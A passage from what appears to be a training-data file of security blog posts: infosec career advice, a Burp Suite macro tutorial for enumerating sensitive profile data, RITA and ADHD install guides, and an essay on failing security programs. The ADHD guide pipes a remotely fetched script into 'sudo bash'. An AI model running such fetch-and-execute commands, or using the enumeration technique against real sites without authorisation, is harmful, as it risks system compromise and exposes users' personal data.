used to understand a system and determine how an attacker could potentially take advantage of it.   Infosec Basic Building Blocks:-Operating Systems-Networking-Programming The first foundation is to understand how operating systems work.   You will want to learn both Linux  and Windows.  Linux because of the tools available and flexibility.  Windows because when you land that awesome IT security job the majority of the computers in the organization will be most likely be Windows based.   The best way to learn Linux is to dive right in and install it and start using it. Getting a book to help you along is a good idea, but nothing will beat the hands on experience of tinkering with it. For most, the easiest way will be to install Linux as a Virtual Machine on their existing system which is convenient as you will want to conversant in the language of virtualization in addition to the operating system fundamentals.   The next key building block is is learning networking, specifically TCP/IP,  the underlying protocol used for nearly all Internet communication. Depending on your level of knowledge, you should start out with a general concept book, such as Network + type training material. Next move on to more advanced material like TCP/IP Illustrated. Knowing TCP/IP is critical \u2013 almost everything you deal with will interface with it.   Finally, you will need to know scripting and programming to some degree. Your level of exposure to programming concepts will determine what you do here. There are many languages to choose from. However  the easiest to get started with is probably Python.  Knowing bash scripting in Linux will also be very helpful.   While you will most likely not be developing software for general use,  there will be many times where you will need to automate something or develop a simple tool to accomplish a task.  Becoming comfortable in one or more  languages should be a goal, but know that it will not happen overnight. This can also end up being a significant investment of time in your quest for good hacking kung fu.   Also, create a Twitter account and go follow a bunch of folks in the security community.  You will learn about things days and weeks before the information hits news sites.  You will see sites and blog posts that you would have never found by just searching the Internet.  And even if you just mostly lurk, you will become part of a community that will help you along in your quest for new skills and be a good first step to find someone that will help mentor you.   Realize that this will not be a one-week training course you sign up and pay for, this is a life-long endeavor.  Once you get further down the road, just like different styles of kung fu,  you will learn that there are subsets to IT Security that you can further specialize in such as forensics, malware analysis, intrusion detection, or penetration testing (and more) and each have their own detailed body of knowledge. It is an exciting journey that will be life changing and rewarding. You will learn new things all of the time, build upon those, and gain the hacking kung fu skills necessary to obtain and excel in an information security career. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Using Simple Burp Macros to Automate Testing\"\nTaxonomies: \"Author, David Fletcher, Red Team, Red Team Tools, Web App, Automated Testing, Burp Macros\"\nCreation Date: \"Wed, 23 Dec 2015 21:53:58 +0000\"\nDavid Fletcher //\n\nRecently, while assessing a web application I noticed content on one of the pages that appeared to be derived from sensitive information stored within the site\u2019s user profiles. To evaluate this functionality and illustrate the potential for sensitive information leakage I needed to:\n\nEnumerate the values on my profile page to create a concrete association between the sensitive and derived values. \n\nCollect and map the sensitive information within the public user profile directory to show that a direct correlation could be easily made \n\nDuring testing, I tried to assess the functionality using the default capabilities of Burp Intruder but because of the way the changes were being reflected I couldn\u2019t easily enumerate the values. This was largely due to the relationship between the profile update page and the content page. When the profile was updated the content would be displayed in a totally separate part of the application. By default, Burp Intruder will alter content in identified positions in a request and analyze the resulting response, optionally following a redirect when instructed to do so. This wasn\u2019t going to be enough to collect the information I was targeting. In hindsight, I could have accomplished this task by scripting the request, response, and redirect outside of Burp. However, I was determined to figure out how I could replicate this functionality with the web application tester\u2019s tool of choice. Anyway, why NOT learn how to use the tools you have available to you in a more effective manner.\n\nEnter the Burp Macro feature.\n\nBurp Macros allow you to arbitrarily perform a set of actions based on a Session Handling Rule that can be tied to any of the other integrated tools that Burp boasts. In this case, we want to:\n\nSubmit a request from Burp Intruder to update the user\u2019s profile\n\nCheck to make sure that the update results in an HTTP 200 status code\n\nPerform a subsequent request to the target page with the derived content\n\nSend the resulting response to Burp Intruder\n\nAnalyze the results extracting the target information from the page\n\nThis same scenario could be applied to other operations like discovery of stored cross-site scripting vulnerabilities (XSS). Extending the functionality, macros have the ability to transform response data generated as a result of a request which could prove useful in analyzing multi-step functionality such as site registration features.\n\nTo illustrate the concept, a simple site has been mocked up to include equivalent functionality. A user profile edit page is used to submit the user\u2019s birthday to the application. A corresponding user profile view page is used to display the derived information. Both pages can be seen in the graphics below.\n\nUser Profile Update Page\n\nUser Profile View Page\n\nWe will use the Burp Macro feature to resolve this derived information to the sensitive information in the user\u2019s profile. To find the macro feature of Burp, you need to navigate to the Options tab then select the Sessions tab.\n\nBurp macro functionality is found under Options > Session.\n\nThe resulting form includes two features that we\u2019ll be using to extract the information we want. First, we need to define a macro that will process our form submissions and cause the subsequent request to be fired. Second, we need to define a session handling rule to cause the macro to fire based on our Burp Intruder Attack.\n\nTo add the macro, scroll to the bottom of the form and click the Add button in the Macro dialog to add a new macro.\n\nAdding a Burp Macro.\n\nThe history window will appear so an appropriate request can be selected. The selected request will fire each time the macro is executed. For our sample site, when a profile update is fired by Burp Intruder we wish to fetch the profile view page and analyze the response. Therefore, we select a call to the ProfileView.aspx page.\n\nBurp Macro Request Selection\n\nWith this simple example, that\u2019s all we really need to do besides naming our macro. The completed macro form can be seen below. Provide a description and click OK to complete the process.\n\nCompleted Burp Macro Form\n\nNote:  The macro properties can include multiple requests and responses which pass parameters from one form to the next and perform intermediate transformations. This can be useful in completing multi-step processes where you may only want to inject content on the first form and derive responses based on intermediate responses.\n\nNow that our macro is complete we need to create a session rule to execute the macro when it sees a request that matches our criteria. At the top of the Options > Sessions page we can find the Session Handling Rules dialogue box. Click Add to create a new Session Handling Rule.\n\nAbove:  Adding a Session Handling Rule.\n\nThe Session Handling Rule Editor will appear and the Details tab will be selected by default. Give the handling rule a name and begin adding rule actions.\n\nSession Handling Rule Editor\n\nMultiple rules can be added to perform several actions in sequence. For our purposes, we only want to execute our macro and we want to do so after our Burp Intruder request has been processed. Click the Add button and select the \u201cRun a post-request macro\u201d option.\n\nAdding a Post-Request Macro\n\nThe Session Handling Action Editor dialog will appear. Select the macro that you created to launch the target page, deselect the \u201cUpdate the first macro\u2026.\u201d Option, and ensure that the option \u201cThe final response from the macro\u201d is selected under \u201cPass back to the invoking tool.\u201d Since we are not processing any parameters in our macro this is unnecessary.\n\nSelecting Session Handling Actions\n\nClick OK to save the Rule Action and then select the Scope tab of the Session Handling Rule Editor dialog. This allows us to specify the tools, URLs, and parameters to which this Session Handling Rule applies. For this example, we will only be using Burp Intruder so we can safely deselect the other tools. We set the URL Scope to the suite scope (we should have already restricted our scope to the target site). Finally, we don\u2019t need to specify parameter scope since we\u2019ll be processing specific parameters with Burp Intruder. Click OK to save this Session Handling Rule and our macro setup is complete.\n\nSetting Session Handling Scope\n\nWith the session handling rule and macro complete, we can test our configuration out using Burp Intruder. First, select the Proxy > HTTP History tab to select the base request that we want to manipulate. On our example site, we\u2019re looking for the ProfileEdit.aspx page with post parameters included. Within the request we should see the parameters that we wish to manipulate (ddlDay, ddlMonth, and ddlYear).\n\nSelecting the Target Request\n\nOnce an acceptable request has been identified, send the entry to Burp Intruder. Simply right-click on the item and select the \u201cSend to Intruder\u201d option.\n\nSend Request to Intruder\n\nSelect the Intruder > Positions tab to configure the appropriate payload positions. Ensure that only the parameters that Intruder will manipulate are selected. For this example, only the day and month columns are significant in producing unique output. Since there are multiple payload positions and multiple payload lengths, we need to select the Cluster Bomb attack type. Cluster Bomb accepts multiple payloads and will iterate through all permutations of the payload combinations. Since we want multiple payloads we cannot select the Sniper or Battering Ram attacks. Likewise, since there isn\u2019t a one-to-one relationship between day and month we shouldn\u2019t select Pitchfork. The completed payload positions form can be seen below.\n\nIntruder Cluster Bomb Attack Setup\n\nWith appropriate payload positions selected, the actual payloads must be defined. In this case, we need simple integers to represent the day and month respectively. Setup for each payload position can be seen below. We aren\u2019t concerned with error handling for varying numbers of days in the month. We will simply ignore any error output from the application.\n\n Payload Setup for Day of Month\n\nPayload Setup for Month of Year\n\nFinally, we can finish our attack setup by setting up Burp Intruder\u2019s options. Since each of these requests must be completed sequentially, we cannot take advantage of multi-threading. This means that Number of Threads must be adjusted to be one.\n\nIntruder Attack Options Request Engine Settings\n\nWe also want to see our enumerated values in the results pane. As a result, we need to set up a Grep \u2013 Extract rule. Select the \u201cExtract the following items from responses\u201d check box and click the Add button to add an extract rule.\n\nAdd Grep \u2013 Extract Rule\n\nThis step is somewhat tricky. Burp Intruder expects that we\u2019ll find the content we wish to extract within the response that was forwarded with the request that we are manipulating. As a result of our macro we will receive a completely different response. Therefore, we can\u2019t use the built-in tools for identifying the extract location. It helps to either have the HTTP History or another Intruder session with our profile view request loaded.\n\nReturn to the Proxy > HTTP History tab a send one of the requests for ProfileView.aspx to Burp Intruder.\n\nSend ProfileVeiw.aspx Request to Intruder\n\nOnce this request has been sent to Intruder, select the Intruder > Options tab, scroll down to Grep \u2013 Extract option, and click the Add button. Now, we are working with the request we expect to receive in our original Intruder Attack. Select the text you are interested in matching (in this case it could be the color identified in the text or in the inline style). Burp will create unique matching expressions for finding this text location. Copy each expression out to a text file so that it can be input into the correct Grep \u2013 Extract form.  The Grep \u2013 Extract form from ProfileView.aspx and the completed Grep \u2013 Extract form from our real attack can both be seen below.\n\nSource Grep \u2013 Extract Form\n\nTarget Grep \u2013 Extract Form\n\nAll of the other Burp Intruder options can be left with their default values. Now, with our setup complete, the only thing left to do is launch our attack. Click the Start Attack button and observe the details in the Intruder Attack window. The output below identifies the day of the month (Payload1), month of the year (Payload2), and corresponding value (\u201clblColorName\u201d>). This data can now be used as a lookup table by using the Save > Results Table option.\n\nEnumerated Sensitive Data Relationship\n\nUsing another Intruder Attack, the public profiles of site users can be viewed and a subsequent Grep \u2013 Match or Grep \u2013 Extract can be used to identify the day and month of their birthday.\n\nHopefully, this post has illustrated the simple power of the Burp Macro. While this example could have been executed equally well using a script, we now have the benefit of a Burp State file to accompany our methodology description. In addition, this introduction to Burp Macros should get you thinking about how this feature can be used to perform more advanced attacks that involve passing parameters from one stage to the next.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"RITA Quick Start Tutorial - Part 1\"\nTaxonomies: \"Blue Team, Blue Team Tools, bro, elasticsearch, kibana, RITA, RITA guide, RITA Quick Start\"\nCreation Date: \"Thu, 31 Mar 2016 19:41:52 +0000\"\nJoe Lillo //\n\n[embed]https://youtu.be/3sZwJz02-jQ[/embed]\n\nCommands & Info:\n\nTutorial dependencies:\nsudo apt-get install git\nElasticsearch and Kibana:\nsudo add-apt-repository -y ppa:webupd8team/java;\nsudo apt-get update;\nsudo apt-get -y install oracle-java8-installer;\nmkdir rita_ws\ncd rita_ws\nwget https://download.elasticsearch.org/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.2.1/elasticsearch-2.2.1.tar.gz\nwget https://download.elastic.co/kibana/kibana/kibana-4.4.2-linux-x64.tar.gz\ntar -zxvf kibana-4.4.2-linux-x64.tar.gz\ntar -zxvf elasticsearch-2.2.1.tar.gz\ncd elasticsearch-2.2.1/bin\n./elasticsearch\n(new terminal with ctrl-shift-t)\ncd ~/rita_ws/kibana-4.4.2-linux-x64\n./kibana\nCheck if Kibana is running in browser:\nlocalhost:5601\nCheck if elasticsearch is running in browser:\nlocalhost:9200\nBro Dependencies:\nsudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev libnuma-dev ethtool libcurl4-openssl-dev\ncd ~/rita_ws\ngit clone https://github.com/actor-framework/actor-framework.git\ncd actor-framework/\n./configure\nmake\nsudo make install\ncd ..\nDownload Bro:\ngit clone --recursive https://github.com/bro/bro.git\nDownload RITA:\ngit clone -b bro_branch https://github.com/blackhillsinfosec/RITA.git \nPatch bro:\ncp RITA/bro_patch.patch bro\ncd bro\npatch -p1 -i patchfile\nBuild & Install Bro:\n./configure --prefix=/usr/local/bro\nmake\nsudo make install\ncd aux/plugins/elasticsearch\n./configure\nmake\nsudo make install\nConfigure Bro:\ncd /usr/local/bro/\nifconfig\nsudo gedit etc/node.cfg\nsudo sh -c \"echo '\\n@load Bro/ElasticSearch/logs-to-elasticsearch.bro' >> /usr/local/bro/share/bro/site/local.bro\"\nRun Bro:\ncd /usr/local/bro/bin\nsudo ./broctl deploy\nTo stop bro:\nsudo ./broctl stop \nGet list of indices from elasticsearch (in browser):\nlocalhost:9200/_cat/indices?v\nBro source code patches:\nOriginal patches were found here: https://github.com/danielguerra69/bro-debian-elasticsearch.\nThe patch file used in this tutorial has a few additional changes to customize it for use with RITA.\n\n "
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Installing the Newest Active Defense Harbinger Distribution\"\nTaxonomies: \"Blue Team, Blue Team Tools, ADHD, setup, tools, VM\"\nCreation Date: \"Mon, 22 Aug 2016 16:24:50 +0000\"\nAlex King //\nHey all! I'm a temp intern (just over the summer) here. I spent a while working on the new Active Defense Harbinger Distribution (ADHD) release, so I'm going to do a quick walk-through on how to set it up for you to play with!\nThis version of ADHD is distributed differently than before. Instead of downloading a huge .iso file, you instead run a command in the prompt, and all the tools will be installed on your Linux machine. For this guide, I'll be running a 64 bit ubuntu VM (available here) in VMware workstation player, a free product that can be downloaded here. Just follow the setup instructions for VMWare player, and you're ready to set up your VM.\nSo, making our ubuntu VM. Open up VMware, and go to player > file > New Virtual Machine. You're faced with a page of options for where the virtual machine comes from. Choose \"Installer Disk Image File (iso)\" and select the iso you downloaded earlier. Then continue, with \"next\".\n\nYou are now confronted with an account creation page. Fill it in with whatever username and password you choose. I'll use the credentials of the old ADHD. The next page allows you to name your VM. Choose whatever you like, and save it where you wish.\n\nNext, select how much space to allocate for the virtual machine's disk, and how it's stored. I just stuck with the defaults.\n\nNow, you should be on an overview of the settings you've chosen. However, we're not done yet. Click on \"customize hardware\" to take care of a few more things.\n\nYou're welcome to play around with the other settings, but the big thing that needs taken care of is under the \"Network Adapter\" section.\n\nOnce you're there, select the \"bridged\" radio button to make sure your machine gets its own IP. Finish up in this menu, and then return to the overview. Leave \"Power on this virtual machine after creation\" checked for convenience, then click finish. It'll take a while as it sets up our new VM, but when it finishes, you'll be confronted with a login prompt. Log in with the password you chose earlier.\n\nNow you're ready to install the ADHD tools. Open up a command prompt (right-click on the desktop, then \"open terminal\") and run the following command:\ncurl -sL https://raw.githubusercontent.com/adhdproject/buildkit/master/\nadhd-install.sh | sudo bash -s\nNote: There is a newer command to run.  Please check the readme for the latest install command.\nAfter a while of downloading and installing tools, it will finish, and you're done! The ADHD toolkit is installed on your VM. To get started using the tools, head over to https://github.com/adhdproject/adhdproject.github.io/blob/master/index.md for documentation. Best of luck!\nInterested in viewing the source for ADHD? Check out the github at https://github.com/adhdproject\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Top Signs Your Org Is Failing at Security\"\nTaxonomies: \"Informational\"\nCreation Date: \"\"\n@1ijax aka The Security Viking* //\nJust when you think the drum has been beaten loudly enough for long enough, a quick survey of organizations across the spectrum will find many companies still just \u201cdon\u2019t get it\u201d.  This list is mostly seen in small to mid size organizations, but sometimes even the big shops make these mistakes. If you\u2019re an executive or member of management and you\u2019re having trouble getting a security program going, or you really have no clue if you have an effective program, read on. If you\u2019re a Security Pro that feels something isn\u2019t right at your organization, and every step forward is met with one, or more, steps backward in your program, there's a good chance that organization is systematically failing.\n\n1. Management Has No Clear Idea What Security Is\nThis is a pretty big one, any \u201csign\u201d mentioned below is a symptom of this problem.  We need to discuss, and Management needs to understand, so we can be ready to tackle everything else on this list. What is the purpose of Security? If the first answer that came to your head was \u201cduh...protect the company\u201d I can\u2019t fault you for thinking that, but I\u2019m going to tell you it\u2019s wrong.  It is actually the executives, in any organization, whose job it is to protect the company, not the rank and file members of Security.\n \nSo what is Security\u2019s job? I\u2019m not going to bore you with some acronym that needs to be remembered, at a very high level it is two simple things. Well it sounds simple, but anyone that studies game theory will tell you that the simpler the rules, the more complex the game.\n \n\nAdvise upper management of the threats the organization is facing.\n\nOversight of the program upper management has tasked to counter those threats\n\n \nThat\u2019s it.  Some Security folks may be screaming at the screen when I say this.  \u201cWho\u2019s this Viking guy, Security is way more complicated than that and I go home each day and tell myself how proud I am that I protected that company!\u201d  Sure we use all sorts of processes, methods, and tools for for our security programs and to tease out what the threats are, where they come from, and what\u2019s the likelihood.  Things like vulnerability management, vendor management programs, compliance programs, red team exercises, architectural/project reviews, Incident response/forensics teams, Identity and Access management, policy creation/review, code reviews, and sometimes just using common sense and throwing a bunch of ideas up on a whiteboard.  At the end of the day all of those things are just details that support our mission of Advising and Overseeing.  I did say simple rules make complex games.\n \nCompanies that fail to recognize this usually fail hard.  They are easy to identify by the lack of any form of strategy, and oh boy just wait to see how they respond to a breach...welcome to the shitshow!  Often times Executives will sound clueless when trying to describe the kind of program they have.  A perfect example of this, I worked at a multi-billion dollar company that recently had doubled in size, and during a town hall meeting with the CEO and COO I asked a simple question that went something like this, \u201cWith the increase in size, and the multiple verticals we are in, has anyone started discussions around appointing a CISO\u201d.  I knew the response would not be perfect but I wasn\u2019t asking them if they had a CISO in mind, I was just simply asking if the discussion had started.  In a way I was testing them to see how the top would respond. The questions were being filtered by the head of HR and submitted via email.  The first sign something was wrong was when the Executive VP, head of HR asked back \u201cwhat is a CISO?\u201d  (we\u2019ll take this moment to pause and allow the security guys to finish laughing.)  Ok, the world is full of acronyms and not everybody can pull from memory every acronym they have heard so I let this go and simply explained what those terms were and expanded on my question a little bit to give it more context.  A couple of minutes pass and the CEO says, we have a question \u201cWith the increase in size and the multiple verticals we are in has anyone started discussions around appointing a CISO or CSO\u201d...great I made it passed the filter.  What happened next made me wish I had never asked.  The CEO responded \u201cI think we have people that are responsible for that so no, next question\u201d.  Did I expect Executives to tip their hand and detail how they are strategically building the Security team to the whole world, no, but at least a half ass attempt to sound like the thought of Security had crossed their mind would have been nice.  You know something like \u201cWhat a great question, we realize doing business in today's technological world is fraught with many perils and that our expansion has added pressure to many teams, including Security.  I agree, now may be a good time for us to review how we are structured to meet those challenges for the future...next question\u201d  If you\u2019re going to feed me bullshit at least pretend to care.  Instead we got an answer that clearly came from an Executive that \u201cdidn\u2019t get it\u201d and had been insulated by many layers from Security.  Right around that time when I asked the question they moved the head of InfoSec another layer lower than the CIO and started the destruction of that team.  Which brings us to our next point...\n \nImproper reporting structure. To report to the CIO or not report to the CIO, is NOT the question -\n \nMany pundits have gone back and forth over the years around the question \u201cwhere does infosec report to\u201d?  As the grip of technology has deepened it has often become the practice to shuffle these teams under the CIO.  The problem with this approach, at the risk of oversimplifying things, IT exists to serve the technological wants and dreams of the business, while the Security\u2019s practitioners job, advice and oversight, *gasp* sometimes has us telling people no.  No, is an impossible word for the CIO, they won\u2019t be CIO for long if they use that word. They can say \u201cYes, but\u2026\u201d, yes but we need more money, yes but we need more headcount...etc  However, can you imagine a CIO saying \u201cNo, we can\u2019t build that app you want to better engage our customers and make more money\u201d.  Neither can I. To make matters worse so many orgs have CIO\u2019s that are new to the game, freshly advanced from a director role.  Typically that director came from a Dev team (the IT team that interfaces the most with the wants and desires of the business...go figure) and now they have the additional responsibility of Security.  Don\u2019t get me wrong, I love the dev guys, and the cats riding unicorns while jumping rainbows and shooting ak-47\u2019s that they create.  App security initiatives typically fail because of InfoSec, not the dev guys (story for another post).  Anyways, that CIO that just got stuck with Security quickly becomes a filter stifling our purpose of Advice and Oversight.  Hey, they are still trying to get their bearings guiding the tech ship and some asshole that fancies himself a Viking keeps telling the dev guys they can\u2019t use TLS 1.0.   God forbid if that inexperienced CIO shuffles security under another layer of IT management.  Try it if you really want to see the wheels fall off.\n \nTo be fair to the CIO, Security Management doesn\u2019t simply say \u201cNo\u201d either. We are in the Risk Mitigation business where battles are chosen carefully and political capital is stored for use at a later date.  Always have a third option more palatable than nothing and be prepared to say \u201cNo, but\u201d a lot.  CISO\u2019s that stonewall the business don\u2019t remain CISO\u2019s for long either.\n \nSome circles of thought have recently advised that companies have it all wrong and the way forward is IT should actually report to a CISO. This is an interesting thought but we still end up with someone that has two roles that can sometimes compromise each other.  Let\u2019s imagine quickly that CISO that has both Security and IT, when the chips are down and that person\u2019s job is on the line, are they going to tell the business what it wants to hear or what it needs to hear?  If you know a way to do both, and be effective at both at the same time, please contact me and share your godlike knowledge.\n \nWho should we report to then?  Of course this debate has been around since the beginning as well. Some say CFO, some COO, Chief General Counsel...etc.  I\u2019m going to simplify the whole thing and tell you now that they are all right.  I\u2019ll give you a hint, remember the simple purpose of Security.  Reporting structure directly impacts #1...\n \n\nAdvise upper management of the threats the organization is facing.\n\nOversight of the program upper management has tasked to counter those threats\n\n \nIn order for Security to fulfill its purpose it *MUST* report directly to a member of the Executive Leadership Team.  Dotted lines do not work here and anything less is just pretending to care about Security.  The vertical your company is in may dictate which member of the ELT that is.  If you\u2019re a manufacturer with strong ties to the DoD it may make sense for the COO to hold this billet.  If you\u2019re a bank that is heavily regulated it may make sense for the CFO to have this billet.  Maybe your org is heavily influenced by legal concerns and the Chief General Counsel is the right person.  Maybe, just maybe, the CIO is a member of the ELT and then it makes sense for Security to report to the CIO.   At the end of the day though it really doesn\u2019t matter which \u201cC\u201d suite person you report to, so long as that person has a \u201cseat at the table\u201d!  This is the only way to ensure that we aren\u2019t playing a game of telephone when millions of customer records, and millions of dollars are on the line.\n \nPolicies not owned by executives -\n \nYou would think that this one would be obvious, unfortunately this is not always the case.  I worked at a shop once where the CIO insisted they get to review policies we proposed before legel did.  Of course Security reported to that CIO so many of our works were met with all sorts of stonewalling and outright watering down.  The phrase of the day was \u201cwe need to keep these close so we can remain fluid and adaptable to the business\u201d...blah, blah, blah.  Basically they liked being in control of the Security policy so it could be changed as needed to enable saying \u201cyes\u201d to the business without adding to the workload.  Remember IT can\u2019t say no.\n \nDrawing from our expanded knowledge of the simple purpose of Security (might be a theme here), this problem directly impacts Security\u2019s ability to provide oversight.  Executive Leadership  *MUST* own the directives that dictate the direction the Security program is running.  Policies are the rules by which all employees must operate.  Without Executive sign off any manager of equal or greater rank then the top Infosec manager can simply interpret what that policy means, as they see fit.  Yes, Security gets that there is a difference between attainable, and aspirational policies.  We might advise against it, we might ask \u201cbut shouldn\u2019t we aspire to being more secure\u201d.  We wouldn\u2019t be good advisors if we simply bent in the direction the wind blew, but we also get that policies that you cannot hope to meet are unworkable for everyone involved.  This is why we need the ELT, you know the folks responsible for protecting the company, to weigh these decisions carefully and agree on the direction forward.  Everything we do, every process, every wall we build is a direct result of Policy.  Only when the ELT owns, and feels comfortable defending, these tough decisions can Security effectively move forward.\n \nIf you haven\u2019t caught on yet, most of the the signs of a failing InfoSec program come directly from Upper Management\u2019s lack of engagement.  Back while studying for a certain cert, because it seemed to be the popular thing to do, I had the privilege to get some training from Shon Harris.  Some of you might recall she wrote a really popular study guide.  I\u2019m quoting from memory so this is probably off the mark, she essentially said \u201cIf Security at your Org does not directly report to the ELT and the ELT or board doesn\u2019t sign off on policy you will not succeed.  If that Org is unwilling to change this, you need to run away and don\u2019t look back\u201d.  Sorry if I butchered this quote, RIP Shon Harris...fuck cancer!\n \nSecurity has no idea what the purpose of security is -\n \nThis next one made me laugh as I typed it but sadly this is becoming more and more true.  Simply put, security resources continue to get stretched thin, and there are a whole lot of folks with only a couple years experience running around with Sr. titles now.  In my day (I know, at 42 I\u2019m an old curmudgeon in the industry) I had to work 8 years before I got a \u201cSenior\u201d title.\n \nIt\u2019s no secret that many of the rank and file people in Security have at one time or another worked in IT.  This is nothing new, good security handlers have been recruiting from the ranks of IT ever since technology was used anywhere.  During the web explosion of the 90\u2019s and 2000\u2019s many of us, myself included, started out as Network or Infrastructure Engineers building and managing the security tools of the day.  As those tools become more complex, Security teams struggled to operationalize them, so it made sense that we would jump over.  In recent years though, as more and more companies became security aware (or at least aware-ish), the gap in qualified individuals has helped bring on some of the problems we have hiring today.  (Insert lame sports analogy about too many expansion teams and not enough top college talent here.)  Double digit negative unemployment numbers has led to an influx of IT folks, managers and engineers, jumping ship and grabbing at the chance to get into this field.  Nothing wrong with that, we love to have you, please send more developers and dev ops guys this way.  However, what used to be a slow trickle of highly qualified IT people learning the ropes from knowledgeable Security staff has quickly become the blind leading the blind.\n \nSo what gives?  At a high level the problem is simple, IT\u2019s job is give the organization the technology it needs to conduct business, Securities job is to advise the company what the risks are.  Their is a subtle difference here in the approach to technology that result in some not so subtle differences in the way we approach our jobs. The new guys haven\u2019t been around long enough to truly know, and live, that subtle difference.  The gaps in Security knowledge are felt hardest at the management tier and the results can be disastrous.  Newly minted IT managers in Security will often times filter, or even completely withhold, the results of an honest attempt to evaluate the company's readiness level.  This natural reaction towards not wanting to look bad to senior management is a glaring violation of the purpose of Security.  I\u2019ve personally heard things like \u201cThere\u2019s too much red, no way management will take us seriously\u201d or \u201c I can\u2019t give them this, it makes us look really bad\u201d and worse \u201cI need you look closely and see if you can change of few of those things\u201d.  The place to politicise a report is not in the findings, it is in your management response.  I get it, Senior management doesn\u2019t want to constantly hear about how bad things were or are, and you should not get into the habit of using FUD to get your program going. Nobody is asking you to wear a tinfoil hat and scream that the sky is falling, but when you shirk your duty to advise you are missing your chance to show them how they can get better.  This is your time to shine and sell a short and long term strategic vision on how the organization can fix these issues and improve itself in the process.  Isn\u2019t that what you were hired to do, advise and provide oversight?  As a manager, don\u2019t you agree that your usefulness to upper management is your ability to provide a vision for the future, and then execute on that vision?  Then why would you deprive yourself that opportunity?\n \nRevolving door of Security staff -\n \nDo people seem to come and go?  Do most of the analysts and engineers on your team have less than 5 years with the company?  Does your program seem to be on track for a couple of years and then everyone seems to vanish overnight?  If you answered yes to any of these then you\u2019ve got a problem.  Your staff at one point or another has asked themselves if they can just hang on and put up with things hoping they\u2019ll get better.  With some regions reporting unemployment numbers as low -16% in the InfoSec fields, your staff will quickly learn they don\u2019t have to wait for you to \u201cfigure it out\u201d.  High turnover can happen for many reasons, and yes more money in a hot market can be a factor, but never let yourself believe that\u2019s the primary reason they left.  People in this field don\u2019t usually leave the role, they leave the company and the managers that run it!\n \nSo how do we fix it?  Assuming the problem isn\u2019t a micromanaging jerk in lower management you first need to understand the type of staff that became Security folks in the first place.  They absolutely read between all the lines!  These are the people that crawl through all your systems and pick apart every nuance looking for threats to your organization, do you not think they are reading your every move and weighing your words?  They know when they are being talked down too, they know when management is not taking Security seriously.  If you don\u2019t care then why should they?  These folks, especially on the defense side, are under a constant stream of new threats.  They often times stay up at night just learning about the latest and greatest problems in the world.  They live, breathe, and eat from the seedy underbelly of the internet and many of them do take \u201cprotecting the company\u201d personally.  Even we we know we shouldn\u2019t we still care at some level.  Appreciation for the work security does is helpful but straight talk goes a long way.  Be honest about your shortcomings as a company, don\u2019t try to wash over them with some pretty facade.  We have highly attuned bullshit meters.  Frank discussions about those issues is like taking the first step in a 12 step program.  Following through with the suggestions Security gives you, rather than shrugging them off like a politician that just wants to say the right thing, goes a long way.  This signals to your security staff that the org ready to at least try to fix things and can have a huge impact on moral.\n \nNow you\u2019re talking the talk, how do we walk it?  Three words....Security Staffing Standard.  Actually outlining in a document how you plan to address staffing levels for this important resource signals to the org, and more importantly to the security staff you can\u2019t seem to keep, that you mean business.  This also helps you address the problem management has quantifying \u201cwhy\u201d when it comes time to ask for headcount.  No two companies will have the same staffing needs and nobody has come up with the perfect formula for what is exactly the number security staff you need.  Personally, when it comes to the number folks in Security technology, I like to use the \u201cratio of IT\u201d measure.  Various studies done have shown orgs range from 3-11% of IT staff are \u201cSecurity\u201d staff.  If you remove the outliers you end up with a range of 6-8%. Do you have 200 folks in IT, then you should have roughly 12-16 Security engineers and analysts.  It feels about right and gives management a target that can be managed to.  I should note this number doesn\u2019t typically include management, and the verticals your org is in can impact the number.  Manufacturing tends to be on the lower end while Government & Banking tend to be higher.  Adjust accordingly, and be prepared to adapt and change that Standard as the environments you operate in change.  Strong word of caution...Do not fall into the tool trap!!! Buying a product does NOT replace a headcount, in fact it may increase the need due to the specialty nature of managing that tool, not to mention the increased findings that can result with a tool that puts your environment under a stronger microscope.  Security is filled with tools and companies promising big ROI if you buy them, just remember that these tools are no different from hammers.  Hammers don\u2019t swing themselves, you still need a carpenter to swing the hammer.\n \nSecurity operates like a seperate IT dept -\n \nSpeaking of tools, all the wonderful tools.  Firewalls, AV, IPS, CCM, DLP, SIEM, IAM, SPAM filters, WAFs, Web proxies and on and on, shiny devices that make server racks look so pretty.  Does your company make someone with the word \u201cSecurity\u201d in their title build and maintain any device that says \u201cSecurity\u201d in its description?  If yes then there is a good chance you don\u2019t understand the root purpose of security and you are wasting a resource.  It\u2019s not entirely your fault, striking a balance between Security ownership, and Security oversight, gets further complicated by the fact that a large number of Security Engineers come from IT.  Contrary to popular belief you do not need a Security title to create ACLs on some fancy Next Gen device, Virtualized with AI in the cloud, now with karate chopping action.  I heard a rumor network guys actually know how to, you know, network things. Every hardware, or virtual, device listed above has network ports, operating systems, some agent for a host, or a method of monitoring a network.  These are all things that IT builds and distributes every day and doesn\u2019t require a \u201cSecurity\u201d title.  Building the policies and the operations around those devices is where the real security magic happens.  A perfect example, I once worked at a company that insisted Security manage the Antivirus solution from top to bottom.  This meant every patch, every hardware swap out, every OS compatibility issue, every end user question...etc was handled by the same staff responsible for sifting through 1000\u2019s of alerts to potential incidents. Not only were we burning through a half a person every day to manage this, it was on a product that is questionable in its ability to provide any Security (discussion for another day).  Given our thin staffing levels this directly took away from our time reviewing actual incidents.  Did anything get through that day?  \u201cDon\u2019t know, didn\u2019t have time to look at all the logs.\u201d  Ask yourself if sitting on the phone arguing with tier 1 tech support, that won\u2019t get off of their script and insists on redoing your troubleshooting steps (i mean seriously, did they even read the ticket you put in?), is really helping you meet the purpose of Security.\n \nThere are always going to be tools that it just makes sense if Security Engineering owns the whole thing.  Some of the tools that we use are a risk to the Org just by the simple fact that you have access to it.  Limit your engineering teams to those tools as much as you can because I guarantee in a month that tier 1 support guy you were facepalming too will be the next Sr. Security Engineer you\u2019ll be training in.\n \nMy company has all these problems, now what -\n \nIf you are C level, and you did happen across my little rant, the ball is in your court.  Own your policies, enable Security by having them report directly to you, staff accordingly, and you will be light years ahead of the next guy.  For the Security guys, even if your org hits all of these, don\u2019t bail right away.  See it as a challenge, do your best to fight the good fight, and when they finally have sucked all the life out of you and you see no attempt to improve, leave with a smile. (or just flat out run like Shon suggested)  You survived, you learned, and you can take all that 